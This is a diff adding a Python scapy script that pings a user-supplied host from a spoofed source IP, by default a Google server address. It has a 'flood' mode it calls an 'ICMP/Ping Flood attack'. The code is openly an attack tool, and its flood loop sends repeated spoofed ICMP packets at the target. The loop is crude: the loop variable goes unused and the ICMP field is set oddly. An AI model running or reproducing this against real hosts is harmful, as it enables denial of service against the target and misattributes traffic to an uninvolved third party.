@@ -1,0 +1,74 @@
+"""
+ Copyright (c) 2017, Syslog777
+ 
+ All rights reserved.
+ 
+ Redistribution and use in source and binary forms, with or without modification,
+ are permitted provided that the following conditions are met:
+ 
+     * Redistributions of source code must retain the above copyright notice,
+       this list of conditions and the following disclaimer.
+     * Redistributions in binary form must reproduce the above copyright notice,
+       this list of conditions and the following disclaimer in the documentation
+       and/or other materials provided with the distribution.
+     * Neither the name of Desktop nor the names of its contributors
+       may be used to endorse or promote products derived from this software
+       without specific prior written permission.
+ 
+ THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+ "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+ LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
+ A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
+ CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
+ PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
+ PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
+ LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
+ NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+"""
+from scapy.all import *
+
+
+class Ping:
+    def __init__(self, parser):
+        parser.add_argument('-f', "--flood", action="store_true")
+        parser.add_argument("--src", nargs="?", default="172.217.12.110",
+                            help="Source IP address for IP layer of ICMP packet\n"
+                                 "Default source address: google server")
+
+        try:
+            self.args = parser.parse_args()
+            if not (self.args.ping):
+                print("Host required!")
+                parser.print_help()
+                sys.exit(1)
+        except BaseException:
+            parser.print_help()
+            sys.exit(1)
+        self.host = self.args.ping
+        self.src = self.args.src
+        self.flood = self.args.flood
+
+    def ping(self):
+        network_layer = IP(src=self.src, dst=self.host)
+        packet = network_layer / ICMP(code=8)
+        print("Ping host at {} from {}".format(self.host, self.src))
+        send(packet)
+
+    def flood_(self):
+        print("\n###########################################")
+        print("# Starting ICMP/Ping Flood attack...")
+        print("###########################################\n")
+
+        for src in range(1, 254):
+            # build the packet
+            network_layer = IP(src=self.src, dst=self.host)
+            packet = network_layer / ICMP(code=8)
+            send(packet)
+
+    def execute(self):
+        if self.flood:
+            self.flood_()
+        elif self.ping:
+            self.ping()
